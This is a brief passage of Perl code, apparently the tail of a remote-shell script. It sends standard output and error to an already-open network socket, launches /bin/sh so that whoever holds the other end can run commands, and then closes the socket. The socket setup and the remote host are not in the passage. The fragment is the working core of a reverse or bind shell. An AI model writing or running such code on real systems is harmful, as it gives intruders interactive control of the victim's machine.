open(STDOUT, ">&", $socket) or die "Cannot redirect STDOUT\n";
open(STDERR, ">&", $socket) or die "Cannot redirect STDERR\n";

# Execute the command shell
system('/bin/sh') or die "Cannot execute shell\n";

# Close the socket
close($socket);
